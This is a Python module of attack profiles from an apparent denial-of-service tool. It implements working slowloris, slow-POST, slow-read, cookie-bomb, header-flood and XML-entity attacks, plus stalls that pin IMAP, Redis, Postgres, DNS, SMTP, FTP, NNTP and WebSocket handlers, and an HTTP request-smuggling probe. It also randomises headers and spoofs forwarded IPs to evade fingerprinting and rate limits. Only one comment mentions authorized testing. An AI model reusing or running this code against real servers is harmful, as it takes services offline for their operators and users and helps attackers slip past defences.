"""Attack profiles.

31 classic + protocol TCP profiles plus the ``udp`` datagram mode (handled by
``udp.py``/the engine) for 32 total modes:

* ``slow-post``   - send headers with a big Content-Length, then drip the
                    body one byte at a time (classic Tor's Hammer).
* ``slow-headers``- never finish the request headers (slowloris).
* ``slow-read``   - send a full request, then read the response in tiny
                    chunks with pauses (slow-read / slow-bytes).
* ``chunked``     - send POST with Transfer-Encoding: chunked and drip
                    small chunks without the terminating 0-chunk.
* ``multipart-slow-upload`` - send a multipart/form-data POST and dribble
                    MIME part bytes slowly, never emitting the closing
                    boundary (exercises multipart parsers/temp-file handling).
* ``expect-continue-abuse`` - send headers with ``Expect: 100-continue`` and
                    stall the body after the interim response, keeping any
                    state the server allocated on ``100 Continue`` pinned.
* ``imap-slow-literal`` - announce an IMAP ``{N}`` literal and never deliver N
                    bytes, pinning the mailbox worker.
* ``redis-resp-slow`` - declare an oversized RESP ``$len`` bulk and never close
                    it, pinning a Redis client read handler.
* ``postgres-startup-slow`` - over-promise a StartupMessage length and withhold
                    the terminator, blocking the forked backend.
* ``dns-tcp-slow`` - announce a large DNS-over-TCP message and never complete
                    it, blocking the resolver's TCP query handler.
* ``nntp-slow-post`` - start an NNTP article and never send the dot-terminator.
* ``idle-hold`` - open a connection and send zero bytes, exhausting idle slot
                    limits with nothing to fingerprint or rate-limit on.
* ``slow-xml`` - announce an oversized ``Content-Length`` and stream an unclosed
                    XML/``DOCTYPE`` prolog, keeping the XML parser buffering forever.
* ``slow-form-parse`` - declare a huge urlencoded body and trickle endless
                    ``key=value&`` pairs the form decoder never finishes.
* ``header-count-flood`` - emit ~2000 tiny headers then complete the request,
                    stressing per-header bookkeeping that caps size but not count.
* ``websocket-slow-frame`` - finish the upgrade, then stream a frame whose
                    declared payload length is never satisfied.
* ``req-smuggling-probe`` - send an ambiguous ``Content-Length`` +
                    ``Transfer-Encoding: chunked`` CL.TE request-smuggling probe.
* ``h2-rapid-reset`` - over one HTTP/2 connection open a rapid run of streams and
                    ``RST_STREAM`` each immediately (CVE-2023-44487 class).
* ``h2-slow-streams`` - open many streams whose ``HEADERS`` omit ``END_STREAM``,
                    then trickle a byte of ``DATA`` forever, pinning half-open state.
* ``h2-continuation-flood`` - start a header block and keep it open with an
                    unbounded run of ``CONTINUATION`` frames that never set ``END_HEADERS``.
* ``h2-hpack-drip`` - feed one valid HPACK block a single octet per frame with a
                    random delay, the HTTP/2 analogue of a slowloris header drip.
* ``tls-slow-hello`` - announce a TLS handshake record far larger than the bytes
                    delivered and dribble a ClientHello that never completes,
                    pinning the server's handshake reassembly buffer.
* ``tls-renego-hold`` - repeatedly emit fresh (partial) ClientHello records to
                    churn (re)handshake initiation and pin handshake state.

Every connection randomizes its headers, User-Agent, path query and timing
to make the traffic harder to fingerprint.
"""

from __future__ import annotations

import asyncio
import base64
import random
import secrets
import string
import struct
import time
from abc import ABC, abstractmethod

from . import h2, tls
from .config import Config
from .stats import Stats

_ALNUM = string.ascii_letters + string.digits
_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
]


def _rand_ip() -> str:
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def _rand_token(length: int = 8) -> str:
    return "".join(random.choice(_ALNUM) for _ in range(length))


def _rand_hex(length: int = 12) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(length))


def _random_header_name(name: str) -> str:
    return "".join(
        ch.upper() if random.random() < 0.5 else ch.lower() if ch.isalpha() else ch for ch in name
    )


def _path(config: Config) -> str:
    if not config.randomize_path:
        return config.path
    separator = "&" if "?" in config.path else "?"
    random_token = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(9))
    return f"{config.path}{separator}{random_token}"


def _base_headers(config: Config, ua: str) -> list[str]:
    headers = [
        f"Host: {config.header_host}",
        f"User-Agent: {ua}",
        f"Accept: {random.choice(_ACCEPTS)}",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Keep-Alive: 900",
        "X-Requested-With: XMLHttpRequest",
    ]
    if random.random() < 0.5:
        headers.append(f"Referer: https://{config.header_host}/")
    if random.random() < 0.35:
        headers.append("Cache-Control: no-cache")
    if random.random() < 0.25:
        headers.append("DNT: 1")
    if random.random() < 0.25:
        headers.append("TE: trailers, deflate")
    if random.random() < 0.5:
        headers.append(f"X-Forwarded-For: {_rand_ip()}")
    if random.random() < 0.4:
        headers.append(f"X-Trace-Id: {secrets.token_hex(6)}")

    # Add custom headers (dict[str, str]; Host/Connection are structural).
    custom = config.custom_headers
    if custom:
        # CLI-sourced: Host and Connection are structural and must not be
        # overridden (they would corrupt request framing). Any other header,
        # including User-Agent and Accept, replaces its default line so the
        # explicit value wins without producing duplicates.
        protected = {"host", "connection"}
        canonical_names = {
            "user-agent": "User-Agent",
            "accept": "Accept",
            "accept-language": "Accept-Language",
            "accept-encoding": "Accept-Encoding",
        }
        replacements: dict[str, str] = {}
        extras: list[str] = []
        for name, value in custom.items():
            lower = name.lower()
            if lower in protected:
                continue
            canonical = canonical_names.get(lower)
            if canonical:
                replacements[canonical] = value
            else:
                extras.append(f"{name}: {value}")
        rebuilt: list[str] = []
        for header in headers:
            key = header.split(":", 1)[0]
            if key in replacements:
                rebuilt.append(f"{key}: {replacements.pop(key)}")
            else:
                rebuilt.append(header)
        headers = rebuilt + extras

    return headers


def _dribble(n: int = 1) -> bytes:
    return "".join(random.choice(_ALNUM) for _ in range(n)).encode()


async def _write(writer: asyncio.StreamWriter, data: bytes, stats: Stats, config: Config) -> None:
    writer.write(data)
    try:
        await asyncio.wait_for(writer.drain(), timeout=config.connect_timeout * 2)
    except TimeoutError:
        raise ConnectionError("write drain timed out")
    stats.bytes_sent += len(data)


async def _halt(stop: asyncio.Event, config: Config) -> None:
    """Sleep a random delay, but wake early if ``stop`` is set."""
    try:
        await asyncio.wait_for(stop.wait(), timeout=config.random_delay())
    except TimeoutError:
        pass


async def _read_available(reader: asyncio.StreamReader, max_bytes: int = 1 << 20) -> bytes:
    """Return bytes already buffered by the peer without blocking the loop.

    ``asyncio.wait_for(reader.read(n), timeout=0)`` never reaps anything: the
    read task is only *scheduled*, then immediately cancelled before its first
    step runs. Instead we schedule the read and yield the loop a couple of
    times so any already-arrived bytes are delivered and the read completes;
    if it has not completed by then we cancel and treat it as "nothing yet".
    """
    task = asyncio.ensure_future(reader.read(max_bytes))
    for _ in range(2):
        await asyncio.sleep(0)
        if task.done():
            break
    if task.done() and not task.cancelled():
        try:
            return task.result()
        except (OSError, asyncio.IncompleteReadError):
            return b""
    task.cancel()
    return b""


async def _drain_responses(
    reader: asyncio.StreamReader, stats: Stats, *, sent_at: float | None = None
) -> None:
    """Consume any bytes the peer has already sent, without blocking.

    Pipelining/range profiles never await a full response; if left unread, the
    server's replies fill our TCP receive window, advertising zero and stalling
    our own writes. This drains buffered response bytes so the send window stays
    open and pressure remains continuous. When ``sent_at`` is supplied and a
    reply is present, the request->response latency and any HTTP status codes
    are recorded for the advisory impact verdict.
    """
    data = await _read_available(reader)
    if data:
        stats.record_response_bytes(data)
        if sent_at is not None:
            stats.record_response_latency(time.monotonic() - sent_at)


async def _announce_then_dribble(
    writer: asyncio.StreamWriter,
    stats: Stats,
    config: Config,
    stop: asyncio.Event,
    announce: bytes,
    count: int,
) -> bool:
    """Send a protocol framing ``announce`` then drip ``count`` body bytes.

    Shared by the protocol-starvation profiles (IMAP literal, Redis bulk string,
    Postgres startup, DNS-over-TCP) whose servers parse a declared length and
    then block waiting for exactly that many octets. We announce an oversized
    length, emit only a few bytes, and never complete the element - pinning the
    server's request handler. Returns ``False`` if stopped early, ``True`` once
    all ``count`` bytes were sent (the caller then holds the socket open).
    """
    await _write(writer, announce, stats, config)
    sent = 0
    while not stop.is_set() and sent < count:
        await _write(writer, _dribble(), stats, config)
        sent += 1
        await _halt(stop, config)
    return not stop.is_set()


class Profile(ABC):
    """Base class for attack profiles."""

    name = ""

    @abstractmethod
    async def run(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        config: Config,
        ua: str,
        stats: Stats,
        stop: asyncio.Event,
    ) -> bool:
        """Dribble the connection until ``stop`` fires or the profile ends.

        Returns:
            True if the profile completed successfully, False if interrupted by stop flag.
        """


class SlowPost(Profile):
    name = "slow-post"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class SlowPostHeaders(Profile):
    name = "slow-post-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats, config)
            await _halt(stop, config)
        if not stop.is_set():
            await _write(writer, b"\r\n", stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class SlowHeaders(Profile):
    name = "slow-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send the request line with the Host/UA headers but never the
        # terminating blank line, so the request stays "in progress".
        method = config.method or "GET"
        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats, config)
        # Send custom headers first (if any), then random X-headers
        if config.custom_headers:
            for name, value in config.custom_headers.items():
                await _write(writer, f"{name}: {value}\r\n".encode(), stats, config)
                await _halt(stop, config)
        while not stop.is_set():
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class SlowRead(Profile):
    name = "slow-read"

    async def run(self, reader, writer, config, ua, stats, stop):
        headers = _base_headers(config, ua)
        req = (
            f"{config.method or 'GET'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent_at = time.monotonic()
        first = True
        while not stop.is_set():
            try:
                chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
            except TimeoutError:
                continue
            if not chunk:  # server closed the connection
                break
            stats.record_response_bytes(chunk)
            if first:  # first reply marks this connection's response latency
                stats.record_response_latency(time.monotonic() - sent_at)
                first = False
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class Chunked(Profile):
    name = "chunked"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Transfer-Encoding: chunked")
        headers.append("Content-Type: application/x-www-form-urlencoded")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent = 0
        while not stop.is_set() and sent < length:
            size = random.randint(1, 4)
            payload = _dribble(size)
            await _write(writer, f"{size:x}\r\n".encode() + payload + b"\r\n", stats, config)
            sent += size
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class WebSocketSlowUpgrade(Profile):
    name = "websocket-slow-upgrade"

    async def run(self, reader, writer, config, ua, stats, stop):
        # WebSocket upgrade request with slow header sending
        method = config.method or "GET"
        headers = _base_headers(config, ua)
        # Add WebSocket-specific headers
        headers.append("Upgrade: websocket")
        headers.append("Connection: Upgrade")
        # Generate WebSocket key (random base64)
        import base64

        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
        headers.append(f"Sec-WebSocket-Key: {ws_key}")
        headers.append("Sec-WebSocket-Version: 13")
        if random.random() < 0.5:
            headers.append("Sec-WebSocket-Protocol: chat")

        # Send request line
        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats, config)

        # Slowly send headers one by one
        for header in headers:
            if stop.is_set():
                return False
            await _write(writer, (header + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never send the terminating blank line to keep upgrade incomplete
        while not stop.is_set():
            # Continue sending random X-headers to keep connection alive
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class HttpPipelining(Profile):
    name = "http-pipelining"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Hold one connection and keep a pipeline of requests in flight for the
        # whole run instead of capping at a fixed count and reconnecting. We
        # opportunistically drain any responses that arrive so our TCP send
        # window never closes and pressure stays continuous.
        method = config.method or "GET"
        headers = _base_headers(config, ua)
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

        while not stop.is_set():
            await _write(writer, req, stats, config)
            await _drain_responses(reader, stats, sent_at=time.monotonic())
            await _halt(stop, config)

        return not stop.is_set()


class RangeHeaderAbuse(Profile):
    name = "range-abuse"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Continuously issue distinct byte-range requests on one connection to
        # exhaust file-handle/range-parser limits for the full duration rather
        # than stopping after a fixed batch. Responses are drained as they
        # arrive to keep the send window open.
        method = config.method or "GET"
        while not stop.is_set():
            headers = _base_headers(config, ua)
            start = random.randint(0, 1000000)
            end = start + random.randint(100, 10000)
            headers.append(f"Range: bytes={start}-{end}")

            req = (
                f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
            ).encode()

            await _write(writer, req, stats, config)
            await _drain_responses(reader, stats, sent_at=time.monotonic())
            await _halt(stop, config)

        return not stop.is_set()


class CookieBomb(Profile):
    name = "cookie-bomb"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send extremely large cookies to exhaust cookie parsing memory
        method = config.method or "GET"
        headers = _base_headers(config, ua)

        # Generate large cookie value (10KB for testing, can be larger in production)
        cookie_size = 10 * 1024  # 10KB (reduced from 1MB for test performance)
        cookie_value = "".join(random.choice(_ALNUM) for _ in range(cookie_size))
        cookie_name = "bomb_cookie"

        # Replace existing cookie if present, or add new one
        headers = [h for h in headers if not h.lower().startswith("cookie:")]
        headers.append(f"Cookie: {cookie_name}={cookie_value}")

        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

        await _write(writer, req, stats, config)

        # Keep connection alive with periodic keep-alive headers
        while not stop.is_set():
            await _halt(stop, config)
            # Send small keep-alive data to maintain connection
            if random.random() < 0.1:  # 10% chance to send keep-alive
                await _write(writer, b"X-Keep-Alive: 1\r\n", stats, config)

        return not stop.is_set()


class JsonRpcSlow(Profile):
    name = "jsonrpc-slow"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send JSON-RPC payloads
        method = config.method or "POST"
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/json")

        # Generate JSON-RPC payload (partial, never completed)
        json_payload = '{"jsonrpc":"2.0","method":"slow_method","params":['
        json_length = len(json_payload)

        headers.append(f"Content-Length: {json_length + 1000}")  # Claim larger size
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()

        await _write(writer, req, stats, config)

        # Slowly send JSON payload character by character
        sent = 0
        while not stop.is_set() and sent < len(json_payload):
            await _write(writer, json_payload[sent : sent + 1].encode(), stats, config)
            sent += 1
            await _halt(stop, config)

        # Continue sending partial JSON data without completion
        while not stop.is_set():
            await _write(writer, b'"param",', stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class SmtpSlowEnvelope(Profile):
    name = "smtp-slow-envelope"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send SMTP envelope commands
        # SMTP operates on different ports, but we'll use the configured port
        smtp_commands = [
            f"EHLO {config.header_host}",
            "MAIL FROM: <slow-test@example.com>",
            "RCPT TO: <recipient@example.com>",
        ]

        for cmd in smtp_commands:
            if stop.is_set():
                return False
            await _write(writer, (cmd + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never send DATA command to keep envelope incomplete
        while not stop.is_set():
            # Continue sending incomplete RCPT TO commands
            await _write(writer, b"RCPT TO: <another@example.com>\r\n", stats, config)
            await _halt(stop, config)

        return not stop.is_set()


class FtpSlowCommand(Profile):
    name = "ftp-slow-command"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Slowly send FTP commands
        ftp_commands = [
            "USER anonymous",
            "PASS test@example.com",
            "PASV",
        ]

        for cmd in ftp_commands:
            if stop.is_set():
                return False
            await _write(writer, (cmd + "\r\n").encode(), stats, config)
            await _halt(stop, config)

        # Never complete data transfer
        while not stop.is_set():
            # Continue sending PASV commands
            await _write(writer, b"PASV\r\n", stats, config)
            await _halt(stop, config)

        return not stop.is_set()


def _multipart_boundary() -> str:
    """Random 24-character multipart boundary (alphanumeric only)."""
    return "".join(random.choice(_ALNUM) for _ in range(24))


class MultipartSlowUpload(Profile):
    name = "multipart-slow-upload"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Multipart uploads exercise a different parser/handling path than the
        # opaque bodies sent by slow-post/chunked (boundary scanning, part
        # buffering, temp-file handling on real upload endpoints). Emit the
        # headers line by line, then dribble MIME-part content forever,
        # withholding the closing boundary so the upload never completes.
        boundary = _multipart_boundary()
        ctype = f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}"

        headers = _base_headers(config, ua)
        # `--header Expect:...` must not leak into multipart (it would turn
        # the upload into an expect/continue transaction), mirroring Rust.
        headers = [h for h in headers if h.split(":", 1)[0].strip().lower() != "expect"]
        headers.append(f"Content-Type: {ctype}")
        headers.append(f"Content-Length: {config.base_post_length}")
        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats, config)
            await _halt(stop, config)
        if stop.is_set():
            return False
        await _write(writer, b"\r\n", stats, config)
        if stop.is_set():
            return False

        # A realistic file-upload preamble, then endless slow part content
        # with only non-closing boundaries so the body never terminates.
        prelude = (
            f"------WebKitFormBoundary{boundary}\r\n"
            'Content-Disposition: form-data; name="upload"; '
            f'filename="{_rand_token(10)}.bin"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        await _write(writer, prelude, stats, config)
        part = 0
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            part += 1
            if part % 64 == 0:
                # Emit a fresh non-final boundary every so often: it keeps
                # multipart parsers scanning and buffering without ever
                # signalling the end of the upload.
                chunk = (
                    f"\r\n------WebKitFormBoundary{boundary}\r\n"
                    f'Content-Disposition: form-data; name="field{part}"\r\n'
                    "\r\n"
                ).encode()
                await _write(writer, chunk, stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class ExpectContinueAbuse(Profile):
    name = "expect-continue-abuse"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Announce a body with `Expect: 100-continue`, consume the interim
        # response if the server sends one, then stall the body itself. Any
        # state the server allocated on its `100 Continue` decision (worker,
        # upload buffer) stays pinned while the connection is held open.
        length = random.randint(config.base_post_length // 2, config.base_post_length)

        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        # A caller-supplied `Expect:` (via --header) wins over the default,
        # mirroring the Rust backend (no duplicate lines either way).
        lowered = [h.split(":", 1)[0].strip().lower() for h in headers]
        if "expect" not in lowered:
            headers.append("Expect: 100-continue")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        sent_at = time.monotonic()
        # Give the server a beat to answer with `100 Continue` (or a final
        # rejection); consume whatever arrived without blocking past the
        # configured read deadline, then keep the promised body stalled.
        try:
            interim = await asyncio.wait_for(reader.read(1024), timeout=config.connect_timeout)
        except TimeoutError:
            interim = b""
        if interim:
            stats.record_response_bytes(interim)
            stats.record_response_latency(time.monotonic() - sent_at)
        if stop.is_set():
            return False

        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats, config)
            sent += 1
            await _halt(stop, config)
        # Even after the announced byte count is exhausted, hold the socket
        # open instead of closing it.
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


class ImapSlowLiteral(Profile):
    name = "imap-slow-literal"

    async def run(self, reader, writer, config, ua, stats, stop):
        # IMAP literals: `<tag> APPEND INBOX {N}` makes the server reply `+ ` and
        # block until it has read exactly N octets. Announce a large literal,
        # drip a few bytes, then never close it - the mailbox worker stays
        # pinned waiting for the rest of the literal.
        tag = _rand_token(4).upper()
        length = random.randint(config.base_post_length, config.base_post_length * 4)
        announce = f"{tag} APPEND INBOX {{{length}}}\r\n".encode()
        if not await _announce_then_dribble(writer, stats, config, stop, announce, 16):
            return False
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class RedisRespSlow(Profile):
    name = "redis-resp-slow"

    async def run(self, reader, writer, config, ua, stats, stop):
        # RESP bulk strings `$<len>\r\n` make Redis size a read handler and wait
        # for exactly len bytes plus a trailing CRLF. Declare a huge bulk
        # argument inside a one-element multibulk command, emit a few bytes, then
        # stall forever with the terminating CRLF withheld.
        length = random.randint(config.base_post_length, config.base_post_length * 4)
        announce = f"*1\r\n${length}\r\n".encode()
        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
            return False
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class PostgresStartupSlow(Profile):
    name = "postgres-startup-slow"

    async def run(self, reader, writer, config, ua, stats, stop):
        # A Postgres frontend StartupMessage is Int32 length (counting itself) +
        # Int32 protocol version (196608 == 3.0) + NUL-separated key/value pairs
        # + a final NUL. Claim a length far larger than we ever send and omit the
        # terminator: the forked backend blocks in secure_read for the packet.
        declared_body = config.base_post_length
        total = 8 + declared_body  # 4-byte length field + 4-byte version
        kv = b"user=slowprobe\x00database=postgres\x00"
        announce = struct.pack(">II", total, 196608) + kv
        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
            return False
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class DnsTcpSlow(Profile):
    name = "dns-tcp-slow"

    async def run(self, reader, writer, config, ua, stats, stop):
        # DNS-over-TCP prefixes every message with a 2-byte big-endian length.
        # Announce a large query, emit the 12-byte header plus a couple of
        # question bytes, then never complete it, so the resolver's TCP handler
        # blocks waiting for the declared octets.
        declared = config.base_post_length
        # Partial query header: ID, flags=RD, QDCOUNT=1, AN/NS/AR=0.
        header = struct.pack(">HHHHHH", 0xAABB, 0x0100, 1, 0, 0, 0)
        announce = struct.pack(">H", declared) + header
        if not await _announce_then_dribble(writer, stats, config, stop, announce, 8):
            return False
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class NntpSlowPost(Profile):
    name = "nntp-slow-post"

    async def run(self, reader, writer, config, ua, stats, stop):
        # NNTP POST: after `POST\r\n` the server replies 340 and reads an article
        # terminated by a line containing only a single `.`. Send POST, drip
        # header/body lines slowly, and never emit the terminating dot-line, so
        # the reader process stays parked mid-transfer.
        if not await _announce_then_dribble(writer, stats, config, stop, b"POST\r\n", 8):
            return False
        while not stop.is_set():
            line = f"X-{_rand_token(6)}: {_rand_token(12)}\r\n"
            await _write(writer, line.encode(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class IdleHold(Profile):
    name = "idle-hold"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Zero-byte idle: open the connection and send NOTHING, holding the
        # socket until stopped. Exhausts servers that cap concurrent connections
        # or idle worker slots (or accept-before-request pools) with no request
        # bytes to fingerprint or rate-limit on.
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


def _strip_framing(headers: list[str]) -> list[str]:
    """Drop headers that would clash with a profile's own request framing."""
    drop = {"content-length", "transfer-encoding", "expect", "te"}
    return [h for h in headers if h.split(":", 1)[0].strip().lower() not in drop]


class SlowXml(Profile):
    name = "slow-xml"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Feed the target's XML parser a billion-laughs / XXE-shaped document
        # prefix with an oversized Content-Length, then dribble body bytes so
        # the (potentially entity-expanding) parser keeps buffering a document
        # that never terminates.
        method = config.method or "POST"
        headers = _strip_framing(_base_headers(config, ua))
        length = random.randint(config.base_post_length * 4, config.base_post_length * 8)
        headers.append("Content-Type: application/xml")
        headers.append(f"Content-Length: {length}")
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        prelude = b'<?xml version="1.0"?>\n<!DOCTYPE bomb [ <!ENTITY a "'
        await _write(writer, prelude, stats, config)
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class SlowFormParse(Profile):
    name = "slow-form-parse"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Announce a huge urlencoded body and emit endless `key=value&` pairs.
        # Frameworks split-and-decode urlencoded bodies field by field while
        # filling a buffer sized from Content-Length; withholding the last pair
        # keeps that parse - and any per-request memory - pinned.
        method = config.method or "POST"
        headers = _strip_framing(_base_headers(config, ua))
        length = random.randint(config.base_post_length * 8, config.base_post_length * 16)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        while not stop.is_set():
            field = f"{_rand_token(6)}={_rand_token(16)}&".encode()
            await _write(writer, field, stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class HeaderCountFlood(Profile):
    name = "header-count-flood"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Many servers cap header *size* but not header *count*. Emit thousands
        # of tiny headers and then COMPLETE the request, forcing the parser to
        # allocate and index the whole header block (a different failure mode
        # from slowloris, which never finishes headers at all).
        method = config.method or "GET"
        await _write(writer, f"{method} {_path(config)} HTTP/1.1\r\n".encode(), stats, config)
        await _write(writer, f"Host: {config.header_host}\r\n".encode(), stats, config)
        n = 0
        while not stop.is_set() and n < 2000:
            await _write(
                writer, f"X-{_rand_token(6)}: {_rand_token(4)}\r\n".encode(), stats, config
            )
            n += 1
            if n % 64 == 0:
                await _halt(stop, config)
        if stop.is_set():
            return False
        await _write(writer, b"\r\n", stats, config)  # complete the header block
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


class WebSocketSlowFrame(Profile):
    name = "websocket-slow-frame"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Unlike websocket-slow-upgrade (which never completes the handshake),
        # this finishes the upgrade request and then streams a WebSocket frame
        # whose declared (masked) payload length is never satisfied - exercising
        # post-handshake frame readers rather than the HTTP header parser.
        method = config.method or "GET"
        headers = _base_headers(config, ua)
        headers.append("Upgrade: websocket")
        headers.append("Connection: Upgrade")
        ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
        headers.append(f"Sec-WebSocket-Key: {ws_key}")
        headers.append("Sec-WebSocket-Version: 13")
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats, config)
        # FIN|text(0x81); MASK set with 16-bit extended length (0xFF), declared
        # payload size, then the 4-byte masking key - then never the payload.
        declared = 4096
        frame_head = bytes([0x81, 0xFF]) + struct.pack(">H", declared) + secrets.token_bytes(4)
        await _write(writer, frame_head, stats, config)
        while not stop.is_set():
            await _write(writer, _dribble(), stats, config)
            await _halt(stop, config)
        return not stop.is_set()


class ReqSmugglingProbe(Profile):
    name = "req-smuggling-probe"

    async def run(self, reader, writer, config, ua, stats, stop):
        # CL.TE request-smuggling probe: present BOTH a Content-Length and
        # Transfer-Encoding: chunked so a front-end and back-end that disagree
        # on the framing desynchronize. This is a detection probe (authorized
        # testing only): it sends the ambiguous request once, then holds the
        # socket so the differential parser state / smuggled byte remains visible
        # in the response rather than grinding a slow-connection primitive.
        method = config.method or "POST"
        headers = _strip_framing(_base_headers(config, ua))
        headers.append("Content-Length: 6")
        headers.append("Transfer-Encoding: chunked")
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        # A chunked terminator plus a smuggled second-request prefix; a parser
        # trusting Content-Length leaves these bytes to poison the next request.
        probe_body = b"0\r\n\r\nGET /smuggled HTTP/1.1\r\n\r\n"
        await _write(writer, req + probe_body, stats, config)
        # Hold so the target's (differential) handling of the body is observable.
        while not stop.is_set():
            await _halt(stop, config)
